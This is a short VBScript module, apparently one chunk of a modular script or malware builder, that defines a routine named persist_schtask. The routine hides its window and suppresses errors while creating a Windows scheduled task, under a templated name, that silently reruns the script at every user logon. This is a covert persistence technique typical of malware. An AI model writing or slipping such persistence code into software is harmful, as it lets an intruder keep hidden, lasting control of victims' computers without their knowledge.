' chunk: persist/schtask
' depends: core/run_cmd
' provides: persist_schtask
' format: vbscript

Sub persist_schtask()
    On Error Resume Next
    _s.Run "cmd /c schtasks /create /tn ""{{PERSIST_NAME}}"" /tr ""wscript.exe //B '""" & _
        WScript.ScriptFullName & """'"" /sc onlogon /f", 0, True
    On Error GoTo 0
End Sub
